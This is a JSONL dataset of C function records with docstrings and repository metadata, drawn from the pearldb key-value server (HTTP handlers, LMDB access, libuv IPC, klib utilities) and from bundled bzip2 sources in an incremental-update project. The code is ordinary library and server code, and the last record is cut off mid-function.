{"docstring": "/**\n * worker has contacted us and wants to start listening\n */\n", "func_signal": "static void __on_pipe_connection(uv_stream_t* pipe, int status)", "code": "{\n    uv_multiplex_t* m = container_of((void*)pipe, uv_multiplex_t, pipe);\n    int e = -1;\n\n    uv_buf_t buf = uv_buf_init(\"PING\", 4);\n\n    ipc_peer_t* pc = calloc(1, sizeof(*pc));\n\n    assert(pipe->type == UV_NAMED_PIPE);\n\n    e = uv_pipe_init(pipe->loop, (uv_pipe_t*)&pc->peer_handle, 1);\n    if (e != 0)\n        fatal(e);\n\n    do\n    {\n        e = uv_accept(pipe, (uv_stream_t*)&pc->peer_handle);\n        if (0 == e)\n            break;\n        else if (-e == EAGAIN)\n            return;\n        else\n            fatal(e);\n    }\n    while (1);\n\n    /* send the listen socket */\n    e = uv_write2(&pc->write_req,\n                  (uv_stream_t*)&pc->peer_handle,\n                  &buf, 1,\n                  (uv_stream_t*)m->listener,\n                  __on_ipc_write);\n    if (e != 0)\n        fatal(e);\n}", "path": "deps\\uv_multiplex\\dispatcher.c", "repo_name": "willemt/pearldb", "stars": 145, "license": "other", "language": "c", "size": 1265}
{"docstring": "/** Get a list of document keys where the key prefix matches the provided key */\n", "func_signal": "static int __get_keys(h2o_req_t *req, kstr_t* key)", "code": "{\n    get_keys_generator_t *gen = h2o_mem_alloc_pool(&req->pool, sizeof(*gen));\n    gen->super.proceed = __get_keys_proceed;\n    gen->super.stop = __get_keys_close;\n    gen->req = req;\n    gen->key = key;\n\n    req->res.status = 200;\n    req->res.reason = \"OK\";\n    h2o_start_response(req, &gen->super);\n\n    int e;\n\n    e = mdb_txn_begin(sv->db_env, NULL, MDB_RDONLY, &gen->txn);\n    if (0 != e)\n        mdb_fatal(e);\n\n    e = mdb_cursor_open(gen->txn, sv->docs, &gen->curs);\n    if (0 != e)\n        mdb_fatal(e);\n\n    MDB_val k = { .mv_size = key->len, .mv_data = key->s }, v;\n\n    /* Get documents where the key has a prefix which matches */\n    e = mdb_cursor_get(gen->curs, &k, &v, MDB_SET_RANGE);\n    switch (e)\n    {\n    case 0:\n        __get_keys_send(gen, e, &k, req);\n        break;\n    case MDB_BAD_VALSIZE:\n        e = mdb_cursor_get(gen->curs, &k, &v, MDB_FIRST);\n        __get_keys_send(gen, e, &k, req);\n        break;\n    default:\n        mdb_fatal(e);\n    }\n\n    return 0;\nfail:\n    return h2oh_respond_with_error(req, 400, \"BAD\");\n}", "path": "src\\main.c", "repo_name": "willemt/pearldb", "stars": 145, "license": "other", "language": "c", "size": 1265}
{"docstring": "// _USE_STRDUP\n", "func_signal": "int main(int argc, char *argv[])", "code": "{\n\tint i, l, n = 1000000, ret, c = 0;\n\tkhash_t(str) *h;\n\tkhint_t k;\n\th = kh_init(str);\n\tif (argc > 1) n = atoi(argv[1]);\n\tfor (i = 1; i <= n; ++i) {\n\t\tchar buf[16];\n\t\tint2str(i, 16, buf);\n\t\tk = kh_put(str, h, strdup(buf), &ret);\n\t\tkh_val(h, k) = i;\n\t}\n\tfor (i = 1; i <= n; ++i) {\n\t\tchar buf[16];\n\t\tint2str(i, 10, buf);\n\t\tk = kh_get(str, h, buf);\n\t\tif (k != kh_end(h)) ++c;\n\t}\n\tfor (k = kh_begin(h); k != kh_end(h); ++k) // explicitly freeing memory takes 10-20% CPU time.\n\t\tif (kh_exist(h, k)) free((char*)kh_key(h, k));\n\tprintf(\"%d\\n\", c);\n\tkh_destroy(str, h);\n\treturn 0;\n}", "path": "deps\\klib\\test\\khash_keith.c", "repo_name": "willemt/pearldb", "stars": 145, "license": "other", "language": "c", "size": 1265}
{"docstring": "// reference: http://www-igm.univ-mlv.fr/~lecroq/string/node14.html\n", "func_signal": "static int *ksBM_prep(const ubyte_t *pat, int m)", "code": "{\n\tint i, *suff, *prep, *bmGs, *bmBc;\n\tprep = (int*)calloc(m + 256, sizeof(int));\n\tbmGs = prep; bmBc = prep + m;\n\t{ // preBmBc()\n\t\tfor (i = 0; i < 256; ++i) bmBc[i] = m;\n\t\tfor (i = 0; i < m - 1; ++i) bmBc[pat[i]] = m - i - 1;\n\t}\n\tsuff = (int*)calloc(m, sizeof(int));\n\t{ // suffixes()\n\t\tint f = 0, g;\n\t\tsuff[m - 1] = m;\n\t\tg = m - 1;\n\t\tfor (i = m - 2; i >= 0; --i) {\n\t\t\tif (i > g && suff[i + m - 1 - f] < i - g)\n\t\t\t\tsuff[i] = suff[i + m - 1 - f];\n\t\t\telse {\n\t\t\t\tif (i < g) g = i;\n\t\t\t\tf = i;\n\t\t\t\twhile (g >= 0 && pat[g] == pat[g + m - 1 - f]) --g;\n\t\t\t\tsuff[i] = f - g;\n\t\t\t}\n\t\t}\n\t}\n\t{ // preBmGs()\n\t\tint j = 0;\n\t\tfor (i = 0; i < m; ++i) bmGs[i] = m;\n\t\tfor (i = m - 1; i >= 0; --i)\n\t\t\tif (suff[i] == i + 1)\n\t\t\t\tfor (; j < m - 1 - i; ++j)\n\t\t\t\t\tif (bmGs[j] == m)\n\t\t\t\t\t\tbmGs[j] = m - 1 - i;\n\t\tfor (i = 0; i <= m - 2; ++i)\n\t\t\tbmGs[m - 1 - suff[i]] = m - 1 - i;\n\t}\n\tfree(suff);\n\treturn prep;\n}", "path": "deps\\klib\\kstring.c", "repo_name": "willemt/pearldb", "stars": 145, "license": "other", "language": "c", "size": 1265}
{"docstring": "/* *_buf is always within [buf, buf_end) upon success */\n", "func_signal": "static const char* parse_int(const char* buf, const char* buf_end, int* value,\n                             int* ret)", "code": "{\n  int v;\n  CHECK_EOF();\n  if (! ('0' <= *buf && *buf <= '9')) {\n    *ret = -1;\n    return NULL;\n  }\n  v = 0;\n  for (; ; ++buf) {\n    CHECK_EOF();\n    if ('0' <= *buf && *buf <= '9') {\n      v = v * 10 + *buf - '0';\n    } else {\n      break;\n    }\n  }\n  \n  *value = v;\n  return buf;\n}", "path": "deps\\picohttpparser\\picohttpparser.c", "repo_name": "willemt/pearldb", "stars": 145, "license": "other", "language": "c", "size": 1265}
{"docstring": "/** Put a document into the database at this key\n * If the \"Prefers: ETag\" header is set, we perform a CAS operation */\n", "func_signal": "static int __put(h2o_req_t *req, kstr_t* key)", "code": "{\n    char* sv_etag = __remove_stored_etag(key);\n    h2o_iovec_t cli_etag = __get_if_match_header_value(req, key);\n    if (0 < cli_etag.len &&\n        !__should_etag_conditional_put_succeed(req, key, sv_etag, &cli_etag))\n    {\n        if (sv_etag)\n            free(sv_etag);\n        return h2oh_respond_with_error(req, 412, \"BAD ETAG\");\n    }\n\n    if (sv_etag)\n        free(sv_etag);\n\n    batch_item_t item = {\n        .flags       = 0,\n        .key.mv_data = key->s,\n        .key.mv_size = key->len,\n        .val.mv_data = req->entity.base,\n        .val.mv_size = req->entity.len,\n    };\n\n    int e = bmon_offer(&sv->batch, &item);\n    if (0 != e)\n        return h2oh_respond_with_error(req, 400, batcher_error);\n    return h2oh_respond_with_success(req, 200);\n}", "path": "src\\main.c", "repo_name": "willemt/pearldb", "stars": 145, "license": "other", "language": "c", "size": 1265}
{"docstring": "// Inflate the block in fp->compressed_block into fp->uncompressed_block\n", "func_signal": "static int inflate_block(BGZF* fp, int block_length)", "code": "{\n\tz_stream zs;\n\tzs.zalloc = NULL;\n\tzs.zfree = NULL;\n\tzs.next_in = fp->compressed_block + 18;\n\tzs.avail_in = block_length - 16;\n\tzs.next_out = fp->uncompressed_block;\n\tzs.avail_out = BGZF_BLOCK_SIZE;\n\n\tif (inflateInit2(&zs, -15) != Z_OK) {\n\t\tfp->errcode |= BGZF_ERR_ZLIB;\n\t\treturn -1;\n\t}\n\tif (inflate(&zs, Z_FINISH) != Z_STREAM_END) {\n\t\tinflateEnd(&zs);\n\t\tfp->errcode |= BGZF_ERR_ZLIB;\n\t\treturn -1;\n\t}\n\tif (inflateEnd(&zs) != Z_OK) {\n\t\tfp->errcode |= BGZF_ERR_ZLIB;\n\t\treturn -1;\n\t}\n\treturn zs.total_out;\n}", "path": "deps\\klib\\bgzf.c", "repo_name": "willemt/pearldb", "stars": 145, "license": "other", "language": "c", "size": 1265}
{"docstring": "// from bigmagic\n", "func_signal": "static uint32_t sse2_bit_count32(const __m128i* block, const __m128i* block_end)", "code": "{\n    const unsigned mu1 = 0x55555555;\n    const unsigned mu2 = 0x33333333;\n    const unsigned mu3 = 0x0F0F0F0F;\n    const unsigned mu4 = 0x0000003F;\n\n\tuint32_t tcnt[4];\n\n    // Loading masks\n    __m128i m1 = _mm_set_epi32 (mu1, mu1, mu1, mu1);\n    __m128i m2 = _mm_set_epi32 (mu2, mu2, mu2, mu2);\n    __m128i m3 = _mm_set_epi32 (mu3, mu3, mu3, mu3);\n    __m128i m4 = _mm_set_epi32 (mu4, mu4, mu4, mu4);\n    __m128i mcnt;\n    mcnt = _mm_xor_si128(m1, m1); // cnt = 0\n\n    __m128i tmp1, tmp2;\n    do\n    {        \n        __m128i b = _mm_load_si128(block);\n        ++block;\n\n        // b = (b & 0x55555555) + (b >> 1 & 0x55555555);\n        tmp1 = _mm_srli_epi32(b, 1);                    // tmp1 = (b >> 1 & 0x55555555)\n        tmp1 = _mm_and_si128(tmp1, m1); \n        tmp2 = _mm_and_si128(b, m1);                    // tmp2 = (b & 0x55555555)\n        b    = _mm_add_epi32(tmp1, tmp2);               //  b = tmp1 + tmp2\n\n        // b = (b & 0x33333333) + (b >> 2 & 0x33333333);\n        tmp1 = _mm_srli_epi32(b, 2);                    // (b >> 2 & 0x33333333)\n        tmp1 = _mm_and_si128(tmp1, m2); \n        tmp2 = _mm_and_si128(b, m2);                    // (b & 0x33333333)\n        b    = _mm_add_epi32(tmp1, tmp2);               // b = tmp1 + tmp2\n\n        // b = (b + (b >> 4)) & 0x0F0F0F0F;\n        tmp1 = _mm_srli_epi32(b, 4);                    // tmp1 = b >> 4\n        b = _mm_add_epi32(b, tmp1);                     // b = b + (b >> 4)\n        b = _mm_and_si128(b, m3);                       //           & 0x0F0F0F0F\n\n        // b = b + (b >> 8);\n        tmp1 = _mm_srli_epi32 (b, 8);                   // tmp1 = b >> 8\n        b = _mm_add_epi32(b, tmp1);                     // b = b + (b >> 8)\n\n        // b = (b + (b >> 16)) & 0x0000003F;\n        tmp1 = _mm_srli_epi32 (b, 16);                  // b >> 16\n        b = _mm_add_epi32(b, tmp1);                     // b + (b >> 16)\n        b = _mm_and_si128(b, m4);                       // (b >> 16) & 0x0000003F;\n\n        mcnt = _mm_add_epi32(mcnt, b);                  // mcnt += b\n\n    } while (block < block_end);\n\n    _mm_store_si128((__m128i*)tcnt, mcnt);\n\n    return tcnt[0] + tcnt[1] + tcnt[2] + tcnt[3];\n}", "path": "deps\\klib\\test\\kbit_test.c", "repo_name": "willemt/pearldb", "stars": 145, "license": "other", "language": "c", "size": 1265}
{"docstring": "/** Delete a document using the provided key\n* @note Delete does not support ETags yet */\n", "func_signal": "static int __delete(h2o_req_t *req, kstr_t * key)", "code": "{\n    int e;\n    MDB_txn *txn;\n    MDB_val k = { .mv_size = key->len, .mv_data = key->s };\n\n    /* TODO: coalesce deletes using bmon */\n    e = mdb_txn_begin(sv->db_env, NULL, 0, &txn);\n    if (0 != e)\n        mdb_fatal(e);\n\n    e = mdb_del(txn, sv->docs, &k, NULL);\n    switch (e)\n    {\n    case 0:\n        break;\n    case MDB_NOTFOUND:\n        e = mdb_txn_commit(txn);\n        if (0 != e)\n            mdb_fatal(e);\n        return h2oh_respond_with_error(req, 404, \"NOT FOUND\");\n    default:\n        mdb_fatal(e);\n    }\n\n    e = mdb_txn_commit(txn);\n    if (0 != e)\n        mdb_fatal(e);\n\n    return h2oh_respond_with_success(req, 200);\nfail:\n    return h2oh_respond_with_error(req, 400, \"BAD\");\n}", "path": "src\\main.c", "repo_name": "willemt/pearldb", "stars": 145, "license": "other", "language": "c", "size": 1265}
{"docstring": "/**\n * @return 1 if the client wants an ETag; otherwise 0\n */\n", "func_signal": "static int __prefers_etag(const h2o_req_t* req)", "code": "{\n    ssize_t header = h2o_find_header_by_str(\n        &req->headers, \"prefers\", strlen(\"prefers\"), SIZE_MAX);\n\n    if (-1 == header)\n        return 0;\n\n    if (!strncmp(req->headers.entries[header].value.base, \"ETag\",\n                 min(strlen(\"ETag\"), req->headers.entries[header].value.len)))\n        return 1;\n\n    return 0;\n}", "path": "src\\main.c", "repo_name": "willemt/pearldb", "stars": 145, "license": "other", "language": "c", "size": 1265}
{"docstring": "/** Get the document corresponding to this key.\n * If we set the \"Prefers: ETag\" header, then provide an up-to-date ETag for\n * this resource. If return_body is set to 1, we respond with the value. */\n", "func_signal": "static int __get(h2o_req_t *req, kstr_t* key, const int return_body)", "code": "{\n    static h2o_generator_t generator = { NULL, NULL };\n    MDB_txn *txn;\n\n    int e = mdb_txn_begin(sv->db_env, NULL, MDB_RDONLY, &txn);\n    if (0 != e)\n        mdb_fatal(e);\n\n    MDB_val k = { .mv_size = key->len, .mv_data = key->s };\n    MDB_val v;\n\n    e = mdb_get(txn, sv->docs, &k, &v);\n    switch (e)\n    {\n    case 0:\n        break;\n    case MDB_NOTFOUND:\n        e = mdb_txn_commit(txn);\n        if (0 != e)\n            mdb_fatal(e);\n        return h2oh_respond_with_error(req, 404, \"NOT FOUND\");\n    default:\n        mdb_fatal(e);\n    }\n\n    e = mdb_txn_commit(txn);\n    if (0 != e)\n        mdb_fatal(e);\n\n    if (__prefers_etag(req))\n    {\n        h2o_iovec_t etag;\n\n        e = __get_or_create_etag(key, &v, &etag);\n        if (-1 == e)\n            goto fail;\n\n        h2o_add_header(\n            &req->pool,\n            &req->res.headers,\n            H2O_TOKEN_ETAG,\n            NULL,\n            etag.base,\n            etag.len);\n    }\n\n    h2o_iovec_t body;\n    if (return_body)\n        body = h2o_iovec_init(v.mv_data, v.mv_size);\n    else\n        body = h2o_iovec_init(\"\", 0);\n\n    req->res.status = 200;\n    req->res.reason = \"OK\";\n    h2o_start_response(req, &generator);\n    h2o_send(req, &body, 1, 1);\n    return 0;\nfail:\n    return h2oh_respond_with_error(req, 400, \"BAD\");\n}", "path": "src\\main.c", "repo_name": "willemt/pearldb", "stars": 145, "license": "other", "language": "c", "size": 1265}
{"docstring": "/**\n * @return item's index on the heap's array; otherwise -1 */\n", "func_signal": "static int __item_get_idx(const heap_t * h, const void *item)", "code": "{\n    unsigned int idx;\n\n    for (idx = 0; idx < h->count; idx++)\n        if (0 == h->cmp(h->array[idx], item, h->udata))\n            return idx;\n\n    return -1;\n}", "path": "deps\\heap\\heap.c", "repo_name": "willemt/pearldb", "stars": 145, "license": "other", "language": "c", "size": 1265}
{"docstring": "// get the compress level from the mode string\n", "func_signal": "static int mode2level(const char *__restrict mode)", "code": "{\n\tint i, compress_level = -1;\n\tfor (i = 0; mode[i]; ++i)\n\t\tif (mode[i] >= '0' && mode[i] <= '9') break;\n\tif (mode[i]) compress_level = (int)mode[i] - '0';\n\tif (strchr(mode, 'u')) compress_level = 0;\n\treturn compress_level;\n}", "path": "deps\\klib\\bgzf.c", "repo_name": "willemt/pearldb", "stars": 145, "license": "other", "language": "c", "size": 1265}
{"docstring": "/* returned pointer is always within [buf, buf_end), or null */\n", "func_signal": "static const char* parse_http_version(const char* buf, const char* buf_end,\n                                      int* minor_version, int* ret)", "code": "{\n  EXPECT_CHAR('H'); EXPECT_CHAR('T'); EXPECT_CHAR('T'); EXPECT_CHAR('P');\n  EXPECT_CHAR('/'); EXPECT_CHAR('1'); EXPECT_CHAR('.');\n  return parse_int(buf, buf_end, minor_version, ret);\n}", "path": "deps\\picohttpparser\\picohttpparser.c", "repo_name": "willemt/pearldb", "stars": 145, "license": "other", "language": "c", "size": 1265}
{"docstring": "/**\n * We are sending worker the listening handle\n */\n", "func_signal": "static void __on_ipc_write(uv_write_t* req, int status)", "code": "{\n    assert(0 == status);\n    ipc_peer_t* ctx = container_of(req, ipc_peer_t, write_req);\n    uv_close((uv_handle_t*)&ctx->peer_handle, __ipc_close_cb);\n}", "path": "deps\\uv_multiplex\\dispatcher.c", "repo_name": "willemt/pearldb", "stars": 145, "license": "other", "language": "c", "size": 1265}
{"docstring": "/*---------------------------------------------*/\n", "func_signal": "static\n__inline__\nBool mainGtU ( UInt32  i1, \n               UInt32  i2,\n               UChar*  block, \n               UInt16* quadrant,\n               UInt32  nblock,\n               Int32*  budget )", "code": "{\n   Int32  k;\n   UChar  c1, c2;\n   UInt16 s1, s2;\n\n   AssertD ( i1 != i2, \"mainGtU\" );\n   /* 1 */\n   c1 = block[i1]; c2 = block[i2];\n   if (c1 != c2) return (c1 > c2);\n   i1++; i2++;\n   /* 2 */\n   c1 = block[i1]; c2 = block[i2];\n   if (c1 != c2) return (c1 > c2);\n   i1++; i2++;\n   /* 3 */\n   c1 = block[i1]; c2 = block[i2];\n   if (c1 != c2) return (c1 > c2);\n   i1++; i2++;\n   /* 4 */\n   c1 = block[i1]; c2 = block[i2];\n   if (c1 != c2) return (c1 > c2);\n   i1++; i2++;\n   /* 5 */\n   c1 = block[i1]; c2 = block[i2];\n   if (c1 != c2) return (c1 > c2);\n   i1++; i2++;\n   /* 6 */\n   c1 = block[i1]; c2 = block[i2];\n   if (c1 != c2) return (c1 > c2);\n   i1++; i2++;\n   /* 7 */\n   c1 = block[i1]; c2 = block[i2];\n   if (c1 != c2) return (c1 > c2);\n   i1++; i2++;\n   /* 8 */\n   c1 = block[i1]; c2 = block[i2];\n   if (c1 != c2) return (c1 > c2);\n   i1++; i2++;\n   /* 9 */\n   c1 = block[i1]; c2 = block[i2];\n   if (c1 != c2) return (c1 > c2);\n   i1++; i2++;\n   /* 10 */\n   c1 = block[i1]; c2 = block[i2];\n   if (c1 != c2) return (c1 > c2);\n   i1++; i2++;\n   /* 11 */\n   c1 = block[i1]; c2 = block[i2];\n   if (c1 != c2) return (c1 > c2);\n   i1++; i2++;\n   /* 12 */\n   c1 = block[i1]; c2 = block[i2];\n   if (c1 != c2) return (c1 > c2);\n   i1++; i2++;\n\n   k = nblock + 8;\n\n   do {\n      /* 1 */\n      c1 = block[i1]; c2 = block[i2];\n      if (c1 != c2) return (c1 > c2);\n      s1 = quadrant[i1]; s2 = quadrant[i2];\n      if (s1 != s2) return (s1 > s2);\n      i1++; i2++;\n      /* 2 */\n      c1 = block[i1]; c2 = block[i2];\n      if (c1 != c2) return (c1 > c2);\n      s1 = quadrant[i1]; s2 = quadrant[i2];\n      if (s1 != s2) return (s1 > s2);\n      i1++; i2++;\n      /* 3 */\n      c1 = block[i1]; c2 = block[i2];\n      if (c1 != c2) return (c1 > c2);\n      s1 = quadrant[i1]; s2 = quadrant[i2];\n      if (s1 != s2) return (s1 > s2);\n      i1++; i2++;\n      /* 4 */\n      c1 = block[i1]; c2 = block[i2];\n      if (c1 != c2) return (c1 > c2);\n      s1 = quadrant[i1]; s2 = quadrant[i2];\n      if (s1 != s2) return (s1 > s2);\n      i1++; i2++;\n      /* 5 */\n      c1 = block[i1]; c2 = block[i2];\n      if (c1 != c2) return (c1 > c2);\n      s1 = quadrant[i1]; s2 = quadrant[i2];\n      if (s1 != s2) return (s1 > s2);\n      i1++; i2++;\n      /* 6 */\n      c1 = block[i1]; c2 = block[i2];\n      if (c1 != c2) return (c1 > c2);\n      s1 = quadrant[i1]; s2 = quadrant[i2];\n      if (s1 != s2) return (s1 > s2);\n      i1++; i2++;\n      /* 7 */\n      c1 = block[i1]; c2 = block[i2];\n      if (c1 != c2) return (c1 > c2);\n      s1 = quadrant[i1]; s2 = quadrant[i2];\n      if (s1 != s2) return (s1 > s2);\n      i1++; i2++;\n      /* 8 */\n      c1 = block[i1]; c2 = block[i2];\n      if (c1 != c2) return (c1 > c2);\n      s1 = quadrant[i1]; s2 = quadrant[i2];\n      if (s1 != s2) return (s1 > s2);\n      i1++; i2++;\n\n      if (i1 >= nblock) i1 -= nblock;\n      if (i2 >= nblock) i2 -= nblock;\n\n      k -= 8;\n      (*budget)--;\n   }\n      while (k >= 0);\n\n   return False;\n}", "path": "incremetalupdate\\src\\main\\cpp\\bzip2\\blocksort.c", "repo_name": "yale8848/EasyIncrementalUpdate", "stars": 238, "license": "mit", "language": "c", "size": 393}
{"docstring": "/*---------------------------------------------------*/\n", "func_signal": "static\nint bz_config_ok ( void )", "code": "{\n   if (sizeof(int)   != 4) return 0;\n   if (sizeof(short) != 2) return 0;\n   if (sizeof(char)  != 1) return 0;\n   return 1;\n}", "path": "incremetalupdate\\src\\main\\cpp\\bzip2\\bzlib.c", "repo_name": "yale8848/EasyIncrementalUpdate", "stars": 238, "license": "mit", "language": "c", "size": 393}
{"docstring": "/*---------------------------------------------------*/\n", "func_signal": "int BZ_API(BZ2_bzDecompressEnd)  ( bz_stream *strm )", "code": "{\n   DState* s;\n   if (strm == NULL) return BZ_PARAM_ERROR;\n   s = strm->state;\n   if (s == NULL) return BZ_PARAM_ERROR;\n   if (s->strm != strm) return BZ_PARAM_ERROR;\n\n   if (s->tt   != NULL) BZFREE(s->tt);\n   if (s->ll16 != NULL) BZFREE(s->ll16);\n   if (s->ll4  != NULL) BZFREE(s->ll4);\n\n   BZFREE(strm->state);\n   strm->state = NULL;\n\n   return BZ_OK;\n}", "path": "incremetalupdate\\src\\main\\cpp\\bzip2\\bzlib.c", "repo_name": "yale8848/EasyIncrementalUpdate", "stars": 238, "license": "mit", "language": "c", "size": 393}
{"docstring": "/*---------------------------------------------------*/\n", "func_signal": "static\nvoid* default_bzalloc ( void* opaque, Int32 items, Int32 size )", "code": "{\n   void* v = malloc ( items * size );\n   return v;\n}", "path": "incremetalupdate\\src\\main\\cpp\\bzip2\\bzlib.c", "repo_name": "yale8848/EasyIncrementalUpdate", "stars": 238, "license": "mit", "language": "c", "size": 393}
{"docstring": "/*---------------------------------------------------*/\n", "func_signal": "int BZ_API(BZ2_bzRead) \n           ( int*    bzerror, \n             BZFILE* b, \n             void*   buf, \n             int     len )", "code": "{\n   Int32   n, ret;\n   bzFile* bzf = (bzFile*)b;\n\n   BZ_SETERR(BZ_OK);\n\n   if (bzf == NULL || buf == NULL || len < 0)\n      { BZ_SETERR(BZ_PARAM_ERROR); return 0; };\n\n   if (bzf->writing)\n      { BZ_SETERR(BZ_SEQUENCE_ERROR); return 0; };\n\n   if (len == 0)\n      { BZ_SETERR(BZ_OK); return 0; };\n\n   bzf->strm.avail_out = len;\n   bzf->strm.next_out = buf;\n\n   while (True) {\n\n      if (ferror(bzf->handle)) \n         { BZ_SETERR(BZ_IO_ERROR); return 0; };\n\n      if (bzf->strm.avail_in == 0 && !myfeof(bzf->handle)) {\n         n = fread ( bzf->buf, sizeof(UChar), \n                     BZ_MAX_UNUSED, bzf->handle );\n         if (ferror(bzf->handle))\n            { BZ_SETERR(BZ_IO_ERROR); return 0; };\n         bzf->bufN = n;\n         bzf->strm.avail_in = bzf->bufN;\n         bzf->strm.next_in = bzf->buf;\n      }\n\n      ret = BZ2_bzDecompress ( &(bzf->strm) );\n\n      if (ret != BZ_OK && ret != BZ_STREAM_END)\n         { BZ_SETERR(ret); return 0; };\n\n      if (ret == BZ_OK && myfeof(bzf->handle) && \n          bzf->strm.avail_in == 0 && bzf->strm.avail_out > 0)\n         { BZ_SETERR(BZ_UNEXPECTED_EOF); return 0; };\n\n      if (ret == BZ_STREAM_END)\n         { BZ_SETERR(BZ_STREAM_END);\n           return len - bzf->strm.avail_out; };\n      if (bzf->strm.avail_out == 0)\n         { BZ_SETERR(BZ_OK); return len; };\n      \n   }\n\n   return 0; /*not reached*/\n}", "path": "incremetalupdate\\src\\main\\cpp\\bzip2\\bzlib.c", "repo_name": "yale8848/EasyIncrementalUpdate", "stars": 238, "license": "mit", "language": "c", "size": 393}
{"docstring": "/*---------------------------------------------------*/\n/* Return  True iff data corruption is discovered.\n   Returns False if there is no problem.\n*/\n", "func_signal": "static\nBool unRLE_obuf_to_output_SMALL ( DState* s )", "code": "{\n   UChar k1;\n\n   if (s->blockRandomised) {\n\n      while (True) {\n         /* try to finish existing run */\n         while (True) {\n            if (s->strm->avail_out == 0) return False;\n            if (s->state_out_len == 0) break;\n            *( (UChar*)(s->strm->next_out) ) = s->state_out_ch;\n            BZ_UPDATE_CRC ( s->calculatedBlockCRC, s->state_out_ch );\n            s->state_out_len--;\n            s->strm->next_out++;\n            s->strm->avail_out--;\n            s->strm->total_out_lo32++;\n            if (s->strm->total_out_lo32 == 0) s->strm->total_out_hi32++;\n         }\n   \n         /* can a new run be started? */\n         if (s->nblock_used == s->save_nblock+1) return False;\n\n         /* Only caused by corrupt data stream? */\n         if (s->nblock_used > s->save_nblock+1)\n            return True;\n   \n         s->state_out_len = 1;\n         s->state_out_ch = s->k0;\n         BZ_GET_SMALL(k1); BZ_RAND_UPD_MASK; \n         k1 ^= BZ_RAND_MASK; s->nblock_used++;\n         if (s->nblock_used == s->save_nblock+1) continue;\n         if (k1 != s->k0) { s->k0 = k1; continue; };\n   \n         s->state_out_len = 2;\n         BZ_GET_SMALL(k1); BZ_RAND_UPD_MASK; \n         k1 ^= BZ_RAND_MASK; s->nblock_used++;\n         if (s->nblock_used == s->save_nblock+1) continue;\n         if (k1 != s->k0) { s->k0 = k1; continue; };\n   \n         s->state_out_len = 3;\n         BZ_GET_SMALL(k1); BZ_RAND_UPD_MASK; \n         k1 ^= BZ_RAND_MASK; s->nblock_used++;\n         if (s->nblock_used == s->save_nblock+1) continue;\n         if (k1 != s->k0) { s->k0 = k1; continue; };\n   \n         BZ_GET_SMALL(k1); BZ_RAND_UPD_MASK; \n         k1 ^= BZ_RAND_MASK; s->nblock_used++;\n         s->state_out_len = ((Int32)k1) + 4;\n         BZ_GET_SMALL(s->k0); BZ_RAND_UPD_MASK; \n         s->k0 ^= BZ_RAND_MASK; s->nblock_used++;\n      }\n\n   } else {\n\n      while (True) {\n         /* try to finish existing run */\n         while (True) {\n            if (s->strm->avail_out == 0) return False;\n            if (s->state_out_len == 0) break;\n            *( (UChar*)(s->strm->next_out) ) = s->state_out_ch;\n            BZ_UPDATE_CRC ( s->calculatedBlockCRC, s->state_out_ch );\n            s->state_out_len--;\n            s->strm->next_out++;\n            s->strm->avail_out--;\n            s->strm->total_out_lo32++;\n            if (s->strm->total_out_lo32 == 0) s->strm->total_out_hi32++;\n         }\n   \n         /* can a new run be started? */\n         if (s->nblock_used == s->save_nblock+1) return False;\n\n         /* Only caused by corrupt data stream? */\n         if (s->nblock_used > s->save_nblock+1)\n            return True;\n   \n         s->state_out_len = 1;\n         s->state_out_ch = s->k0;\n         BZ_GET_SMALL(k1); s->nblock_used++;\n         if (s->nblock_used == s->save_nblock+1) continue;\n         if (k1 != s->k0) { s->k0 = k1; continue; };\n   \n         s->state_out_len = 2;\n         BZ_GET_SMALL(k1); s->nblock_used++;\n         if (s->nblock_used == s->save_nblock+1) continue;\n         if (k1 != s->k0) { s->k0 = k1; continue; };\n   \n         s->state_out_len = 3;\n         BZ_GET_SMALL(k1); s->nblock_used++;\n         if (s->nblock_used == s->save_nblock+1) continue;\n         if (k1 != s->k0) { s->k0 = k1; continue; };\n   \n         BZ_GET_SMALL(k1); s->nblock_used++;\n         s->state_out_len = ((Int32)k1) + 4;\n         BZ_GET_SMALL(s->k0); s->nblock_used++;\n      }\n\n   }\n}", "path": "incremetalupdate\\src\\main\\cpp\\bzip2\\bzlib.c", "repo_name": "yale8848/EasyIncrementalUpdate", "stars": 238, "license": "mit", "language": "c", "size": 393}
{"docstring": "/*---------------------------------------------------*/\n", "func_signal": "static\nvoid flush_RL ( EState* s )", "code": "{\n   if (s->state_in_ch < 256) add_pair_to_block ( s );\n   init_RL ( s );\n}", "path": "incremetalupdate\\src\\main\\cpp\\bzip2\\bzlib.c", "repo_name": "yale8848/EasyIncrementalUpdate", "stars": 238, "license": "mit", "language": "c", "size": 393}
{"docstring": "/*---------------------------------------------------*/\n", "func_signal": "static\nBool copy_output_until_stop ( EState* s )", "code": "{\n   Bool progress_out = False;\n\n   while (True) {\n\n      /*-- no output space? --*/\n      if (s->strm->avail_out == 0) break;\n\n      /*-- block done? --*/\n      if (s->state_out_pos >= s->numZ) break;\n\n      progress_out = True;\n      *(s->strm->next_out) = s->zbits[s->state_out_pos];\n      s->state_out_pos++;\n      s->strm->avail_out--;\n      s->strm->next_out++;\n      s->strm->total_out_lo32++;\n      if (s->strm->total_out_lo32 == 0) s->strm->total_out_hi32++;\n   }\n\n   return progress_out;\n}", "path": "incremetalupdate\\src\\main\\cpp\\bzip2\\bzlib.c", "repo_name": "yale8848/EasyIncrementalUpdate", "stars": 238, "license": "mit", "language": "c", "size": 393}
{"docstring": "/*---------------------------------------------------*/\n", "func_signal": "int BZ_API(BZ2_bzBuffToBuffCompress) \n                         ( char*         dest, \n                           unsigned int* destLen,\n                           char*         source, \n                           unsigned int  sourceLen,\n                           int           blockSize100k, \n                           int           verbosity, \n                           int           workFactor )", "code": "{\n   bz_stream strm;\n   int ret;\n\n   if (dest == NULL || destLen == NULL || \n       source == NULL ||\n       blockSize100k < 1 || blockSize100k > 9 ||\n       verbosity < 0 || verbosity > 4 ||\n       workFactor < 0 || workFactor > 250) \n      return BZ_PARAM_ERROR;\n\n   if (workFactor == 0) workFactor = 30;\n   strm.bzalloc = NULL;\n   strm.bzfree = NULL;\n   strm.opaque = NULL;\n   ret = BZ2_bzCompressInit ( &strm, blockSize100k, \n                              verbosity, workFactor );\n   if (ret != BZ_OK) return ret;\n\n   strm.next_in = source;\n   strm.next_out = dest;\n   strm.avail_in = sourceLen;\n   strm.avail_out = *destLen;\n\n   ret = BZ2_bzCompress ( &strm, BZ_FINISH );\n   if (ret == BZ_FINISH_OK) goto output_overflow;\n   if (ret != BZ_STREAM_END) goto errhandler;\n\n   /* normal termination */\n   *destLen -= strm.avail_out;   \n   BZ2_bzCompressEnd ( &strm );\n 